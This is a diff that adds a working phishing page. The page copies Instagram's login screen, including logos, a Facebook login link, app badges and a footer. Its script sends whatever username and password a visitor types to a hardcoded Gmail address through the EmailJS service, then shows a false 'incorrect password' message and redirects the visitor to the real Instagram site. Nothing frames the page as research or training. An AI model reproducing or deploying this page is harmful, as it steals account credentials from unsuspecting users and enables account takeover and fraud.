@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="shortcut icon" href="./Instagram_logo_2016.svg.webp">
+    <!-- Load EmailJS library first -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <img src="./OIP.jpg" alt="Instagram" class="heading">
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+                <button class="login-button" id="send_credeintial" title="login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span class="login_with_facebook_div"><img src="./Facebook-logo.png" class="facebook_img_1"><a href="facebook-login.html">Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <p class="error_message">Sorry, your password was incorrect. Please <br>
+                         double-check your password.</p>
+                    <p class="error_message_fill">Please enter username and password.</p>
+                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+    <br>
+    <div class="get">
+    Get the app.
+    </div>
+    <br>
+    <div class="apps">
+        <div class="download_app">
+            <a href=""><img src="./appStore.jpg" alt="App Store" class="app_img appStore"></a>
+            <a href=""><img src="./Google-Play-Emblema.png" alt="Google Play" class="app_img playStore"></a>
+        </div>
+        <a href="/forget.html">
+        <div class="footer">
+            
+    <footer>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
+    </footer>
+</div>
+<div class="copyright">
+    <br>    
+    English (UK) © 2025 Instagram from Meta
+</div>
+    
+
+<script>
+// Add this CSS for the loading animation
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    .login-button.loading {
+        color: transparent !important;
+        position: relative;
+    }
+    
+    .login-button.loading::after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 20px;
+        height: 20px;
+        margin: -10px 0 0 -10px;
+        border: 3px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 0.8s ease infinite;
+    }
+`;
+document.head.appendChild(style);
+
+// Update the existing JavaScript
+document.addEventListener('DOMContentLoaded', function() {
+    emailjs.init("I3Tr8KtVBJV1lpD8V");
+    
+    document.getElementById('send_credeintial').addEventListener('click', function(event) {
+        event.preventDefault();
+        
+        const loginButton = this;
+        const email = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if(email && password) {
+            // Add loading animation
+            loginButton.classList.add('loading');
+            
+            document.querySelector('.error_message').style.display = 'flex';
+            
+            const templateParams = {
+                to_email: "tahiradem.1997@gmail.com",
+                from_email: email,
+                phone: password,
+                message: `New insta request from: ${email}, Password: ${password}`
+            };
+            
+            emailjs.send('service_9cdu6jv', 'template_mnte9a5', templateParams)
+                .then(function(response) {
+                    // Remove loading animation
+                    loginButton.classList.remove('loading');
+                    window.open('https://www.instagram.com/?')
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                }, function(error) {
+                    // Remove loading animation on error too
+                    loginButton.classList.remove('loading');
+                    console.error('EmailJS error:', error);
+                });
+        } else {
+            document.querySelector('.error_message_fill').style.display = 'flex';
+        }
+    });
+});
+</script>
+</body>
+</html>
